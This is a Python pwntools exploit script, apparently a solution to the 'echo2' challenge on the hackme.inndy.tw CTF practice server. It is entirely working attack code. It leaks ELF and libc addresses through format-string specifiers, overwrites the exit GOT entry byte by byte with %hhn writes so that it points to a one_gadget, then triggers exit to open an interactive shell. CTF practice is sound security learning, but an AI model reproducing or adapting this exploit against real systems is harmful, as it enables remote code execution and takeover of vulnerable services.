from pwn import *
#context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])


def leak_addr(target,arg):
	payload = arg
	target.sendline(payload)
	res = target.recvuntil('\n')
	return int(res,16)



def fmt(target,got,magic):
	for i in range(6):
		payload = "%{}c%8$hhn".format(magic&0xff).ljust(16,'6')
		payload += p64(got + i)
		target.sendline(payload)
		magic = magic >> 8


def main():
	target = remote('hackme.inndy.tw', 7712)
	addr_elf = leak_addr(target,'%41$p') - 0xa03
	addr_libc = leak_addr(target,'%43$p') - 0xf0 - 0x20740
	elf = ELF('./echo2')
	offset_exit_got = elf.got['exit']
	exit_got = offset_exit_got + addr_elf
	one_gadget = 0xf0897
	addr_one_gadget = addr_libc + one_gadget
	fmt(target,exit_got,addr_one_gadget)
	log.success('address_elf: ' + hex(addr_elf))
	log.success('address_libc: ' + hex(addr_libc))
	log.success('exit_got: ' + hex(exit_got))
	log.info('---sending exit to getshell---')
	target.sendline('exit')
	target.interactive()	                     

if __name__ == '__main__':
	main()